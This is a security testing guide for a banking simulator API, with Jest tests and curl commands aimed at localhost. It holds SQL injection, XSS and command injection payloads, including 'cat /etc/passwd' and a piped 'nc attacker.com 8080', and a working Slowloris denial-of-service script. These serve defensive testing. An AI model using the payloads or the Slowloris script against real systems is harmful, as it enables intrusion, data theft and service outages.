# 🧪 Secure Banking System - Testing Methodology Guide

## Overview

This document provides comprehensive testing methodologies for validating the security implementation of the Banking Simulator System. It covers all security layers from authentication to infrastructure, ensuring the system meets government-grade security standards.

---

## 🎯 Testing Philosophy

### Security Testing Principles
1. **Defense in Depth**: Test all security layers
2. **Assume Breach**: Test recovery and containment
3. **Continuous Testing**: Integrate into CI/CD pipeline
4. **Risk-Based Approach**: Focus on high-impact vulnerabilities
5. **Compliance Validation**: Ensure regulatory compliance

### Testing Categories
- **🔐 Authentication & Authorization Testing**
- **🛡️ Input Validation & Injection Testing**
- **🔒 Encryption & Data Protection Testing**
- **⚡ Performance & DoS Testing**
- **📊 Compliance & Audit Testing**
- **🏗️ Infrastructure Security Testing**

---

## 1. 🔐 Authentication & Authorization Testing

### 1.1 Password Policy Testing

#### Test Cases
```bash
# Test Case 1: Password Strength Validation
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "weak123",
    "firstName": "Test",
    "lastName": "User"
  }'
# Expected: 400 Bad Request - Password too weak

# Test Case 2: Strong Password Acceptance
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "StrongP@ssw0rd2024!",
    "firstName": "Test",
    "lastName": "User"
  }'
# Expected: 201 Created - User registered successfully
```

#### Automated Testing Script
```javascript
// password-policy.test.js
describe('Password Policy Tests', () => {
  test('Should reject passwords shorter than 12 characters', async () => {
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'test@example.com',
        password: 'Short1!',
        firstName: 'Test',
        lastName: 'User'
      })
    expect(response.status).toBe(400)
    expect(response.body.error).toContain('password')
  })

  test('Should reject passwords without special characters', async () => {
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'test@example.com',
        password: 'LongPassword123',
        firstName: 'Test',
        lastName: 'User'
      })
    expect(response.status).toBe(400)
  })

  test('Should reject common breached passwords', async () => {
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'test@example.com',
        password: 'Password123!',
        firstName: 'Test',
        lastName: 'User'
      })
    expect(response.status).toBe(400)
    expect(response.body.error).toContain('breached')
  })
})
```

### 1.2 Rate Limiting Testing

#### Brute Force Protection Test
```bash
#!/bin/bash
# brute-force-test.sh

# Test authentication rate limiting
for i in {1..10}; do
  echo "Attempt $i:"
  curl -X POST http://localhost:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{
      "email": "test@example.com",
      "password": "wrongpassword"
    }' \
    -w "\nStatus: %{http_code}\n" \
    -s
  sleep 1
done

# Expected: First 5 attempts should return 401, subsequent attempts should return 429
```

#### Load Testing Script
```javascript
// rate-limiting.test.js
import { performance } from 'perf_hooks'

describe('Rate Limiting Tests', () => {
  test('Should enforce authentication rate limits', async () => {
    const promises = []
    const startTime = performance.now()
    
    // Send 10 rapid login attempts
    for (let i = 0; i < 10; i++) {
      promises.push(
        request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'wrongpassword'
          })
      )
    }
    
    const responses = await Promise.all(promises)
    const rateLimitedResponses = responses.filter(r => r.status === 429)
    
    expect(rateLimitedResponses.length).toBeGreaterThan(0)
  })

  test('Should enforce general API rate limits', async () => {
    const promises = []
    
    // Send 150 rapid requests (limit is 100 per 15 minutes)
    for (let i = 0; i < 150; i++) {
      promises.push(
        request(app)
          .get('/api/health')
      )
    }
    
    const responses = await Promise.all(promises)
    const rateLimitedResponses = responses.filter(r => r.status === 429)
    
    expect(rateLimitedResponses.length).toBeGreaterThan(0)
  })
})
```

### 1.3 Session Security Testing

#### JWT Security Test
```javascript
// jwt-security.test.js
describe('JWT Security Tests', () => {
  test('Should reject tampered tokens', async () => {
    const validToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...'
    const tamperedToken = validToken.slice(0, -10) + 'tampered123'
    
    const response = await request(app)
      .get('/api/banking/accounts')
      .set('Authorization', `Bearer ${tamperedToken}`)
    
    expect(response.status).toBe(401)
  })

  test('Should reject expired tokens', async () => {
    // Create an expired token (you'll need to implement this helper)
    const expiredToken = createExpiredToken()
    
    const response = await request(app)
      .get('/api/banking/accounts')
      .set('Authorization', `Bearer ${expiredToken}`)
    
    expect(response.status).toBe(401)
    expect(response.body.error).toContain('expired')
  })

  test('Should enforce token refresh rotation', async () => {
    const refreshResponse = await request(app)
      .post('/api/auth/refresh')
      .send({ refreshToken: validRefreshToken })
    
    expect(refreshResponse.status).toBe(200)
    expect(refreshResponse.body.tokens.accessToken).toBeDefined()
    expect(refreshResponse.body.tokens.refreshToken).toBeDefined()
    expect(refreshResponse.body.tokens.refreshToken).not.toBe(validRefreshToken)
  })
})
```

---

## 2. 🛡️ Input Validation & Injection Testing

### 2.1 SQL Injection Testing

#### Manual Testing
```bash
# Test Case 1: Classic SQL Injection
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@example.com'\'' OR 1=1 --",
    "password": "anything"
  }'
# Expected: 400 Bad Request - Invalid input detected

# Test Case 2: Union-based SQL Injection
curl -X GET "http://localhost:3000/api/banking/accounts?id=1' UNION SELECT password FROM users--"
# Expected: 400 Bad Request - Invalid input detected

# Test Case 3: Blind SQL Injection
curl -X GET "http://localhost:3000/api/banking/accounts?id=1' AND SLEEP(5)--"
# Expected: 400 Bad Request - Invalid input detected
```

#### Automated SQL Injection Testing
```javascript
// sql-injection.test.js
describe('SQL Injection Tests', () => {
  const sqlInjectionPayloads = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users--",
    "'; INSERT INTO users VALUES('hacker', 'password'); --",
    "' AND SLEEP(5)--",
    "' OR 1=1#",
    "admin'--",
    "' OR 'x'='x"
  ]

  sqlInjectionPayloads.forEach(payload => {
    test(`Should block SQL injection payload: ${payload}`, async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          email: payload,
          password: 'password'
        })
      
      expect(response.status).toBe(400)
      expect(response.body.code).toBe('INVALID_INPUT')
    })
  })
})
```

### 2.2 XSS Testing

#### Cross-Site Scripting Test
```bash
# Test Case 1: Reflected XSS
curl -X POST http://localhost:3000/api/banking/transfer \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "fromAccountId": "valid-uuid",
    "toIban": "DE89370400440532013000",
    "amount": 100,
    "reference": "<script>alert(\"XSS\")</script>"
  }'
# Expected: 400 Bad Request or sanitized input

# Test Case 2: Stored XSS
curl -X POST http://localhost:3000/api/banking/accounts \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "accountName": "<img src=x onerror=alert(\"XSS\")>",
    "accountType": "checking",
    "currency": "EUR",
    "countryCode": "DE"
  }'
# Expected: Input sanitized or rejected
```

#### Automated XSS Testing
```javascript
// xss-protection.test.js
describe('XSS Protection Tests', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '\'\';!--"<XSS>=&{()}',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload=alert("XSS")>',
    '<input type="image" src="x" onerror=alert("XSS")>'
  ]

  xssPayloads.forEach(payload => {
    test(`Should sanitize XSS payload: ${payload}`, async () => {
      const response = await request(app)
        .post('/api/banking/accounts')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          accountName: payload,
          accountType: 'checking',
          currency: 'EUR',
          countryCode: 'DE'
        })
      
      if (response.status === 201) {
        // If account created, check that the name is sanitized
        expect(response.body.account.accountName).not.toContain('<script>')
        expect(response.body.account.accountName).not.toContain('javascript:')
      } else {
        // Should be rejected
        expect(response.status).toBe(400)
      }
    })
  })
})
```

### 2.3 Command Injection Testing

#### Manual Command Injection Test
```bash
# Test Case 1: Command injection in file operations
curl -X POST http://localhost:3000/api/banking/generate-iban \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "countryCode": "DE; cat /etc/passwd",
    "bankCode": "TEST"
  }'
# Expected: 400 Bad Request - Invalid input

# Test Case 2: Command injection with pipe
curl -X POST http://localhost:3000/api/banking/transfer \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "fromAccountId": "valid-uuid",
    "toIban": "DE89370400440532013000",
    "amount": 100,
    "reference": "Payment | nc attacker.com 8080"
  }'
# Expected: Input sanitized or rejected
```

---

## 3. 🔒 Encryption & Data Protection Testing

### 3.1 Data Encryption Testing

#### Database Encryption Verification
```sql
-- Test encrypted field storage
SELECT 
  iban_encrypted,
  bic_encrypted 
FROM bank_accounts 
LIMIT 1;

-- Verify that encrypted fields are not readable
-- Should return encrypted data, not plain text
```

#### Encryption Testing Script
```javascript
// encryption.test.js
describe('Data Encryption Tests', () => {
  test('Should encrypt sensitive fields in database', async () => {
    // Create account
    const response = await request(app)
      .post('/api/banking/accounts')
      .set('Authorization', `Bearer ${validToken}`)
      .send({
        accountName: 'Test Account',
        accountType: 'checking',
        currency: 'EUR',
        countryCode: 'DE'
      })
    
    expect(response.status).toBe(201)
    
    // Check database directly
    const dbResult = await db.query(
      'SELECT iban_encrypted, bic_encrypted FROM bank_accounts WHERE id = $1',
      [response.body.account.id]
    )
    
    // Encrypted fields should not contain readable IBAN/BIC
    expect(dbResult.rows[0].iban_encrypted).not.toMatch(/^[A-Z]{2}[0-9]{2}/)
    expect(dbResult.rows[0].bic_encrypted).not.toMatch(/^[A-Z]{6}[A-Z0-9]{2}/)
  })

  test('Should decrypt data correctly for authorized users', async () => {
    const response = await request(app)
      .get('/api/banking/accounts')
      .set('Authorization', `Bearer ${validToken}`)
    
    expect(response.status).toBe(200)
    expect(response.body.accounts).toBeDefined()
    
    // Decrypted IBAN should be properly formatted
    if (response.body.accounts.length > 0) {
      const account = response.body.accounts[0]
      expect(account.iban).toMatch(/^[A-Z]{2}[0-9]{2}[A-Z0-9]+$/)
    }
  })
})
```

### 3.2 TLS/SSL Testing

#### SSL Configuration Test
```bash
#!/bin/bash
# ssl-test.sh

echo "Testing TLS configuration..."

# Test TLS version support
echo "Testing TLS 1.3 support:"
openssl s_client -connect localhost:443 -tls1_3 -servername localhost 2>/dev/null | grep "Protocol"

# Test cipher suites
echo "Testing cipher suites:"
nmap --script ssl-enum-ciphers -p 443 localhost

# Test certificate validity
echo "Testing certificate:"
openssl s_client -connect localhost:443 -servername localhost 2>/dev/null | openssl x509 -noout -dates

# Test HSTS headers
echo "Testing HSTS headers:"
curl -I https://localhost:443 2>/dev/null | grep -i strict-transport-security
```

#### Automated TLS Testing
```javascript
// tls-security.test.js
describe('TLS Security Tests', () => {
  test('Should enforce HTTPS in production', async () => {
    const httpResponse = await request(`http://localhost:${port}`)
      .get('/api/health')
    
    if (process.env.NODE_ENV === 'production') {
      expect(httpResponse.status).toBe(301) // Redirect to HTTPS
    }
  })

  test('Should include security headers', async () => {
    const response = await request(app)
      .get('/api/health')
    
    expect(response.headers['strict-transport-security']).toBeDefined()
    expect(response.headers['x-content-type-options']).toBe('nosniff')
    expect(response.headers['x-frame-options']).toBe('DENY')
    expect(response.headers['x-xss-protection']).toBe('1; mode=block')
  })
})
```

---

## 4. ⚡ Performance & DoS Testing

### 4.1 Load Testing

#### API Load Test
```bash
#!/bin/bash
# load-test.sh

# Install artillery if not already installed
# npm install -g artillery

# Basic load test
artillery quick --count 100 --num 10 http://localhost:3000/api/health

# Financial operations load test
artillery run financial-load-test.yml
```

#### Artillery Configuration
```yaml
# financial-load-test.yml
config:
  target: "http://localhost:3000"
  phases:
    - duration: 60
      arrivalRate: 10
  payload:
    path: "users.csv"
    fields:
      - "email"
      - "password"

scenarios:
  - name: "Banking Operations"
    weight: 100
    flow:
      - post:
          url: "/api/auth/login"
          json:
            email: "{{ email }}"
            password: "{{ password }}"
          capture:
            json: "$.tokens.accessToken"
            as: "token"
      - get:
          url: "/api/banking/accounts"
          headers:
            Authorization: "Bearer {{ token }}"
      - post:
          url: "/api/banking/transfer"
          headers:
            Authorization: "Bearer {{ token }}"
            X-Transaction-ID: "{{ $randomUuid }}"
            X-Client-Version: "1.0.0"
          json:
            fromAccountId: "{{ $randomUuid }}"
            toIban: "DE89370400440532013000"
            amount: 100
            reference: "Load test transfer"
```

### 4.2 DDoS Testing

#### Slowloris Attack Test
```python
# slowloris-test.py
import socket
import time
import threading
import random

def slowloris_attack(target_host, target_port, socket_count):
    """
    Simulate Slowloris attack for testing DDoS protection
    """
    sockets = []
    
    for i in range(socket_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_host, target_port))
            
            s.send(f"GET /api/health HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_host}\r\n".encode())
            s.send("User-Agent: slowloris-test\r\n".encode())
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
            
            sockets.append(s)
        except socket.error:
            break
    
    print(f"Created {len(sockets)} connections")
    
    # Keep connections alive
    while True:
        for s in sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
            except socket.error:
                sockets.remove(s)
        
        time.sleep(15)

if __name__ == "__main__":
    # Test DDoS protection
    slowloris_attack("localhost", 3000, 200)
```

### 4.3 Resource Exhaustion Testing

#### Memory Usage Test
```javascript
// resource-exhaustion.test.js
describe('Resource Exhaustion Tests', () => {
  test('Should handle large payload sizes', async () => {
    const largePayload = 'x'.repeat(15 * 1024 * 1024) // 15MB payload
    
    const response = await request(app)
      .post('/api/banking/transfer')
      .set('Authorization', `Bearer ${validToken}`)
      .send({
        fromAccountId: "valid-uuid",
        toIban: "DE89370400440532013000",
        amount: 100,
        reference: largePayload
      })
    
    expect(response.status).toBe(413) // Payload too large
  })

  test('Should limit concurrent connections', async () => {
    const promises = []
    
    // Create many concurrent connections
    for (let i = 0; i < 1000; i++) {
      promises.push(
        request(app)
          .get('/api/health')
          .timeout(5000)
      )
    }
    
    const results = await Promise.allSettled(promises)
    const failures = results.filter(r => r.status === 'rejected')
    
    // Should have some connection failures due to limits
    expect(failures.length).toBeGreaterThan(0)
  })
})
```

---

## 5. 📊 Compliance & Audit Testing

### 5.1 Audit Trail Testing

#### Transaction Audit Test
```javascript
// audit-trail.test.js
describe('Audit Trail Tests', () => {
  test('Should log all financial transactions', async () => {
    const transferResponse = await request(app)
      .post('/api/banking/transfer')
      .set('Authorization', `Bearer ${validToken}`)
      .set('X-Transaction-ID', 'test-txn-001')
      .set('X-Client-Version', '1.0.0')
      .send({
        fromAccountId: validAccountId,
        toIban: "DE89370400440532013000",
        amount: 100,
        reference: "Audit test transfer"
      })
    
    expect(transferResponse.status).toBe(200)
    
    // Check audit log
    const auditLog = await db.query(
      'SELECT * FROM security_audit_log WHERE event_type = $1 ORDER BY created_at DESC LIMIT 1',
      ['FINANCIAL_TRANSACTION']
    )
    
    expect(auditLog.rows.length).toBe(1)
    expect(auditLog.rows[0].details.amount).toBe(100)
    expect(auditLog.rows[0].details.transactionId).toBe('test-txn-001')
  })

  test('Should log authentication events', async () => {
    const loginResponse = await request(app)
      .post('/api/auth/login')
      .send({
        email: testUser.email,
        password: testUser.password
      })
    
    expect(loginResponse.status).toBe(200)
    
    // Check security audit log
    const auditLog = await db.query(
      'SELECT * FROM security_audit_log WHERE event_type = $1 AND user_id = $2 ORDER BY created_at DESC LIMIT 1',
      ['LOGIN_SUCCESS', testUser.id]
    )
    
    expect(auditLog.rows.length).toBe(1)
    expect(auditLog.rows[0].event_category).toBe('AUTH')
  })
})
```

### 5.2 Data Retention Testing

#### GDPR Compliance Test
```javascript
// gdpr-compliance.test.js
describe('GDPR Compliance Tests', () => {
  test('Should support right to erasure', async () => {
    // Create test user
    const user = await createTestUser()
    
    // Request data deletion
    const deleteResponse = await request(app)
      .delete(`/api/auth/user/${user.id}`)
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ reason: 'User requested deletion' })
    
    expect(deleteResponse.status).toBe(200)
    
    // Verify user data is anonymized/deleted
    const userCheck = await db.query(
      'SELECT * FROM users WHERE id = $1',
      [user.id]
    )
    
    expect(userCheck.rows.length).toBe(0)
    
    // Verify audit log retains transaction data but anonymizes user info
    const auditCheck = await db.query(
      'SELECT * FROM security_audit_log WHERE user_id = $1',
      [user.id]
    )
    
    auditCheck.rows.forEach(row => {
      expect(row.details.email).toBe('[REDACTED]')
      expect(row.details.firstName).toBe('[REDACTED]')
    })
  })

  test('Should export user data on request', async () => {
    const exportResponse = await request(app)
      .get('/api/auth/export-data')
      .set('Authorization', `Bearer ${validToken}`)
    
    expect(exportResponse.status).toBe(200)
    expect(exportResponse.body.userData).toBeDefined()
    expect(exportResponse.body.accounts).toBeDefined()
    expect(exportResponse.body.transactions).toBeDefined()
  })
})
```

### 5.3 PCI DSS Testing

#### Payment Card Security Test
```javascript
// pci-dss.test.js
describe('PCI DSS Compliance Tests', () => {
  test('Should never store sensitive authentication data', async () => {
    // Check that no card data is stored in database
    const cardDataCheck = await db.query(`
      SELECT column_name, table_name 
      FROM information_schema.columns 
      WHERE column_name ILIKE ANY(ARRAY['%card%', '%cvv%', '%pan%', '%track%'])
    `)
    
    expect(cardDataCheck.rows.length).toBe(0)
  })

  test('Should encrypt cardholder data if stored', async () => {
    // If card data needs to be stored, verify it's encrypted
    const encryptedDataCheck = await db.query(`
      SELECT column_name 
      FROM information_schema.columns 
      WHERE column_name LIKE '%encrypted%'
    `)
    
    expect(encryptedDataCheck.rows.length).toBeGreaterThan(0)
  })

  test('Should implement network segmentation', async () => {
    // Test that database is not directly accessible from external networks
    const networkTest = await testDatabaseAccess('external-ip')
    expect(networkTest.accessible).toBe(false)
  })
})
```

---

## 6. 🏗️ Infrastructure Security Testing

### 6.1 Container Security Testing

#### Docker Security Scan
```bash
#!/bin/bash
# docker-security-test.sh

echo "Building Docker image..."
docker build -t banking-api:test .

echo "Scanning for vulnerabilities..."
# Using Trivy for vulnerability scanning
trivy image banking-api:test

echo "Checking Docker security..."
# Using Docker Bench Security
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
./docker-bench-security.sh

echo "Checking container configuration..."
# Verify security settings
docker inspect banking-api:test | jq '.[0].Config.User'
docker inspect banking-api:test | jq '.[0].Config.SecurityOpt'
```

#### Container Runtime Security
```yaml
# security-scan.yml (for CI/CD)
name: Security Scan
on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Build Docker image
        run: docker build -t banking-api:test .
      
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'banking-api:test'
          format: 'sarif'
          output: 'trivy-results.sarif'
      
      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'
      
      - name: Run container security tests
        run: |
          # Test that container runs as non-root
          docker run --rm banking-api:test id
          
          # Test that container has no unnecessary capabilities
          docker run --rm --cap-drop=ALL banking-api:test capsh --print
```

### 6.2 Network Security Testing

#### Port Scanning Test
```bash
#!/bin/bash
# network-security-test.sh

echo "Testing open ports..."
nmap -sS -O localhost

echo "Testing firewall rules..."
# Test that only necessary ports are open
expected_ports=(22 80 443 3000)
open_ports=$(nmap -p- localhost | grep "open" | awk '{print $1}' | cut -d'/' -f1)

for port in $open_ports; do
  if [[ ! " ${expected_ports[@]} " =~ " ${port} " ]]; then
    echo "WARNING: Unexpected port $port is open"
  fi
done

echo "Testing SSL/TLS configuration..."
# Test SSL configuration
sslscan localhost:443
testssl.sh localhost:443
```

#### Network Policy Testing
```yaml
# network-policy-test.yml
apiVersion: v1
kind: Pod
metadata:
  name: network-test-pod
spec:
  containers:
  - name: network-test
    image: nicolaka/netshoot
    command: ["/bin/bash"]
    args: ["-c", "while true; do sleep 30; done;"]
```

```bash
# Test network policies
kubectl apply -f network-policy-test.yml

# Test that pods can only communicate as per policy
kubectl exec -it network-test-pod -- nmap banking-api-service
kubectl exec -it network-test-pod -- nc -zv database-service 5432
```

---

## 7. 🔧 Automated Testing Pipeline

### 7.1 CI/CD Security Integration

#### GitHub Actions Security Pipeline
```yaml
# .github/workflows/security.yml
name: Security Testing Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    services:
      postgres:
        image: postgres:13
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: banking_test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run security linting
        run: |
          npm install -g eslint-plugin-security
          npx eslint --ext .js --config security-rules.js .
      
      - name: Run dependency security scan
        run: |
          npm audit --audit-level high
          npx snyk test
      
      - name: Run SAST (Static Application Security Testing)
        run: |
          npx semgrep --config=auto .
      
      - name: Run unit tests with security focus
        run: npm run test:security
        env:
          NODE_ENV: test
          DATABASE_URL: postgresql://postgres:test@localhost:5432/banking_test
      
      - name: Run DAST (Dynamic Application Security Testing)
        run: |
          npm start &
          sleep 10
          npm run test:integration:security
      
      - name: Build Docker image
        run: docker build -t banking-api:${{ github.sha }} .
      
      - name: Scan Docker image
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            -v $HOME/Library/Caches:/root/.cache/ \
            aquasec/trivy:latest image banking-api:${{ github.sha }}
      
      - name: Upload security test results
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: security-test-results
          path: |
            test-results/
            security-reports/
```

### 7.2 Security Test Automation

#### Jest Security Test Configuration
```javascript
// jest.security.config.js
module.exports = {
  displayName: 'Security Tests',
  testMatch: [
    '**/__tests__/security/**/*.test.js',
    '**/*.security.test.js'
  ],
  testEnvironment: 'node',
  setupFilesAfterEnv: ['<rootDir>/test/security-setup.js'],
  collectCoverageFrom: [
    'middleware/security.js',
    'middleware/auth.js',
    'utils/encryption.js',
    'routes/**/*.js'
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  },
  testTimeout: 30000
}
```

#### Security Test Setup
```javascript
// test/security-setup.js
import { supabase } from '../express-supabase-api-starter/config/database.js'
import logger from '../express-supabase-api-starter/utils/logger.js'

// Mock logger for tests
jest.mock('../express-supabase-api-starter/utils/logger.js', () => ({
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
  security: jest.fn(),
  audit: jest.fn()
}))

// Global test setup
beforeAll(async () => {
  // Setup test database
  await setupTestDatabase()
  
  // Setup test users
  await createTestUsers()
  
  // Initialize security monitoring
  initializeSecurityMonitoring()
})

afterAll(async () => {
  // Cleanup test data
  await cleanupTestDatabase()
  
  // Close database connections
  await supabase.$disconnect()
})

beforeEach(() => {
  // Reset security monitoring
  resetSecurityCounters()
  
  // Clear mocks
  jest.clearAllMocks()
})

// Helper functions
global.createTestUser = async (role = 'user') => {
  // Implementation for creating test users
}

global.getValidToken = async (userId) => {
  // Implementation for getting valid JWT tokens
}

global.getExpiredToken = () => {
  // Implementation for creating expired tokens
}
```

---

## 8. 📈 Security Metrics & Reporting

### 8.1 Security KPIs

#### Key Performance Indicators
```javascript
// security-metrics.js
const securityMetrics = {
  // Authentication metrics
  authentication: {
    loginSuccessRate: 95, // Target: > 95%
    averageLoginTime: 200, // Target: < 500ms
    bruteForceAttemptsBlocked: 100, // Monitor trends
    sessionTimeoutRate: 5 // Target: < 10%
  },
  
  // Security incident metrics
  incidents: {
    securityIncidentsPerWeek: 0, // Target: 0
    averageIncidentResponseTime: 15, // Target: < 30 minutes
    falsePositiveRate: 2, // Target: < 5%
    threatDetectionAccuracy: 98 // Target: > 95%
  },
  
  // Compliance metrics
  compliance: {
    auditTrailCompleteness: 100, // Target: 100%
    dataEncryptionCoverage: 100, // Target: 100%
    policyComplianceScore: 95, // Target: > 90%
    vulnerabilityResolutionTime: 24 // Target: < 48 hours
  }
}
```

### 8.2 Security Testing Reports

#### Test Report Generator
```javascript
// generate-security-report.js
import fs from 'fs'
import path from 'path'

class SecurityReportGenerator {
  constructor() {
    this.results = {
      authentication: [],
      injection: [],
      encryption: [],
      performance: [],
      compliance: []
    }
  }

  addTestResult(category, test, result) {
    this.results[category].push({
      testName: test,
      status: result.status,
      severity: result.severity,
      description: result.description,
      timestamp: new Date().toISOString()
    })
  }

  generateReport() {
    const report = {
      generatedAt: new Date().toISOString(),
      summary: this.generateSummary(),
      categories: this.results,
      recommendations: this.generateRecommendations()
    }

    const reportPath = path.join(__dirname, 'reports', `security-report-${Date.now()}.json`)
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2))
    
    return report
  }

  generateSummary() {
    const total = Object.values(this.results).flat().length
    const passed = Object.values(this.results).flat().filter(r => r.status === 'PASS').length
    const failed = total - passed

    return {
      totalTests: total,
      passed,
      failed,
      passRate: ((passed / total) * 100).toFixed(2) + '%',
      overallStatus: failed === 0 ? 'SECURE' : failed < 5 ? 'MODERATE_RISK' : 'HIGH_RISK'
    }
  }

  generateRecommendations() {
    const failed = Object.values(this.results).flat().filter(r => r.status === 'FAIL')
    
    return failed.map(test => ({
      category: test.category,
      issue: test.testName,
      severity: test.severity,
      recommendation: this.getRecommendation(test.testName)
    }))
  }

  getRecommendation(testName) {
    const recommendations = {
      'Password Strength': 'Enforce stronger password policies with increased complexity requirements',
      'SQL Injection': 'Implement parameterized queries and input validation',
      'XSS Protection': 'Enhance input sanitization and output encoding',
      'Rate Limiting': 'Adjust rate limiting thresholds or implement progressive delays',
      'Encryption': 'Verify encryption implementation and key management practices'
    }

    return recommendations[testName] || 'Review security implementation for this component'
  }
}

export default SecurityReportGenerator
```

---

## 🎯 Testing Checklist

### Pre-Deployment Security Testing

#### ✅ Authentication & Authorization
- [ ] Password policy enforcement
- [ ] Brute force protection
- [ ] Session security
- [ ] JWT token validation
- [ ] Role-based access control
- [ ] Multi-factor authentication (if enabled)

#### ✅ Input Validation
- [ ] SQL injection prevention
- [ ] XSS protection
- [ ] Command injection protection
- [ ] Path traversal protection
- [ ] File upload security
- [ ] Parameter pollution protection

#### ✅ Data Protection
- [ ] Data encryption at rest
- [ ] Data encryption in transit
- [ ] Key management security
- [ ] Backup encryption
- [ ] Data anonymization
- [ ] GDPR compliance

#### ✅ API Security
- [ ] Rate limiting effectiveness
- [ ] CORS configuration
- [ ] Security headers
- [ ] API authentication
- [ ] Input sanitization
- [ ] Error handling security

#### ✅ Infrastructure Security
- [ ] Container security
- [ ] Network security
- [ ] Firewall configuration
- [ ] SSL/TLS configuration
- [ ] Server hardening
- [ ] Monitoring and alerting

#### ✅ Compliance
- [ ] Audit trail completeness
- [ ] Data retention policies
- [ ] Regulatory compliance
- [ ] Security policy adherence
- [ ] Documentation completeness

---

## 🚀 Quick Start Testing Guide

### 1. Environment Setup
```bash
# Clone repository
git clone <repository-url>
cd banking-system

# Install dependencies
npm install

# Install security testing tools
npm install -g snyk eslint-plugin-security

# Setup test database
createdb banking_test
```

### 2. Run Security Tests
```bash
# Run all security tests
npm run test:security

# Run specific test categories
npm run test:auth
npm run test:injection
npm run test:encryption

# Run penetration tests
npm run test:pentest

# Generate security report
npm run security:report
```

### 3. Continuous Monitoring
```bash
# Setup monitoring
npm run security:monitor

# Check security metrics
npm run security:metrics

# Scan for vulnerabilities
npm run security:scan
```

---

## 📚 Resources & Tools

### Security Testing Tools
- **SAST**: SonarQube, Semgrep, CodeQL
- **DAST**: OWASP ZAP, Burp Suite, Nikto
- **Dependency Scanning**: Snyk, npm audit, OWASP Dependency Check
- **Container Scanning**: Trivy, Clair, Anchor
- **Network Scanning**: Nmap, Masscan, SSLyze

### Compliance Testing
- **PCI DSS**: ASV scanning tools
- **GDPR**: Data mapping and privacy tools
- **SOX**: Financial audit tools
- **ISO 27001**: Security management tools

### Performance Testing
- **Load Testing**: Artillery, k6, JMeter
- **Stress Testing**: wrk, siege, ab (Apache Bench)
- **Monitoring**: Prometheus, Grafana, ELK Stack

---

## 🎯 Conclusion

This comprehensive testing methodology ensures that the Secure Banking System meets government-grade security standards through:

- ✅ **Automated Security Testing** in CI/CD pipeline
- ✅ **Comprehensive Test Coverage** across all security layers
- ✅ **Compliance Validation** for regulatory requirements
- ✅ **Performance & DoS Testing** for system resilience
- ✅ **Infrastructure Security Testing** for deployment security
- ✅ **Continuous Monitoring** and reporting

Regular execution of these tests ensures ongoing security posture and compliance with industry standards.

---

*Last Updated: January 2025*
*Document Version: 1.0*
*Classification: Internal Use*
